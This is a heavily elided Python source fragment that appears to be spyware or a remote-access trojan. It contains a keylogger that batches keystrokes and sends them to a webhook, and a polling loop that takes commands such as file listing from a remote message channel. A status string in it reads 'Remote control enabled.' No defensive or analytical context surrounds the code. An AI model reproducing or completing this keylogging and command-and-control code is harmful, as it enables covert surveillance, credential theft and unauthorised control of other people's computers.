...
def get_system_info():
    try:
        ...
        return {
            ...
            "note": "Tokens inaccessible without authentication. Remote control enabled."
        }
    except Exception as e:
...
def log_keys():
    ...
    def on_press(key):
        try:
            keys.append(str(key))
            if len(keys) >= 10:
                send_to_webhook({"keylog": " ".join(keys)}, webhook_url)
                keys.clear()
        except:
            pass
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            if isinstance(messages, list) and messages:
                ...
                elif last_message.startswith("dir:"):
                    return {"list_files": last_message[4:].strip()}
        return None
    except Exception:
        return None
...
def main():
    ...
    while True:
        ...
        if isinstance(command, dict) and "list_files" in command:
            result = list_files(command["list_files"])
